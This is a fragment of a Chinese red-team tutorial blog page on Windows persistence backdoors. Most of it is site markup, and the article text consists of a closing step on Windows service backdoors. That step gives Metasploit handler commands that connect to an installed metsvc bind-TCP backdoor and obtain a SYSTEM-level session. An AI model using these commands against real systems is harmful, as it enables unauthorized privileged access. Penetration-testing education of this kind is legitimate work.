+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E9%98%9F%E4%BB%8E0%E5%88%B01%E5%AE%9E%E6%88%98%E7%AF%87--%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%BA%8C)/640-1653130200232205.png" alt="图片"></p>
+<p>如上图，服务后门安装成功。接着我们启用另一个终端并进入msfconsole，使用如下命令即可连接后门：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler set payload windows/metsvc_bind_tcp set RHOST 192.168.52.1 //目标机ip set LPORT 31337 //如上图，后门安装过程信息中有 exploit //获取到的会话是system权限</span><br></pre></td></tr></table></figure></article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><div class="post_share"><div class="social-share" data-image="/img/backup.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="/js/social-share.min.css" media="print" onload="this.media='all'"><script src="/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/5a4257e.html"><img class="prev-cover" src="/img/backup.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">红队攻击-绕过waf以及IDS等流量设备</div></div></a></div><div class="next-post pull-right"><a href="/posts/212af6cb.html"><img class="next-cover" src="/img/backup.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">红蓝对抗之钓鱼篇：常见钓鱼思路总结</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/a83843a4.html" title="MSSQL不出网文件落地上线方式"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">MSSQL不出网文件落地上线方式</div></div></a></div><div><a href="/posts/8822d497.html" title="优秀靶机推荐"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">优秀靶机推荐</div></div></a></div><div><a href="/posts/dad1caf4.html" title="msf及socks代理转发"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">msf及socks代理转发</div></div></a></div><div><a href="/posts/721e2121.html" title="内网渗透常用命令"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">内网渗透常用命令</div></div></a></div><div><a href="/posts/169a3c2d.html" title="利用goproxy http上线不出网主机"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">利用goproxy http上线不出网主机</div></div></a></div><div><a href="/posts/9663dae0.html" title="域内信息收集命令"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">域内信息收集命令</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Windows-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-number">1.</span> <span class="toc-text">4.Windows 计划任务后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Windows-%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-number">2.</span> <span class="toc-text">5.Windows 服务后门</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/backup.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By Fstraw</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://ccc-f.github.io/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/fancybox.umd.js"></script><script src="/js/instantpage.min.js" type="module"></script><script src="/js/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>var requestSetting = function (from,set) {
+    var from = from
+    var setting = set.split(',').filter(function(item){
+    return from.indexOf(item) > -1
+    });
+    setting = setting.length == 0 ? from :setting;
+    return setting
+}
+
+var guestInfo = requestSetting(['nick','mail','link'],'')
+var requiredFields = requestSetting(['nick','mail'],'nick,mail')
+function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      master:'7f26fd285f1e832baef86f5bcaadd06a',
+      pageSize:'10',
+      lang:'zh-CN',
+      placeholder:'建议使用QQ邮箱,评论头像采用QQ头像',
+      recordIP:'true',
+      enableQQ:'true',
+      requiredFields: requiredFields,
+      appId: '9xmgN7UpSgxN7k2zu16HHcl6-gzGzoHsz',
+      appKey: '6t7uQFgue7owtGg4R7ieIYWu',
+      avatar: 'monsterid',
+      serverURLs: 'https://9xmgn7up.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('/js/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="/js/fireworks.min.js"></script><script src="/js/activate-power-mode.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script>((window.gitter = {}).chat = {}).options = {
+  disableDefaultChat: true,
+};
+document.addEventListener('gitter-sidecar-ready', (e) => {
+  const GitterChat = e.detail.Chat
+  let chat
+
+  function initGitter () {
+    chat = new GitterChat({
+      room: 'blogroom/test',
+      activationElement: '#chat_btn'
+    });
+  }
+
+  initGitter()
+
+  if (false) {
+    document.addEventListener('pjax:complete', () => {
+      chat.destroy()
+      initGitter()
+    })
+  }
+
+})</script><script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async="async" defer="defer"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
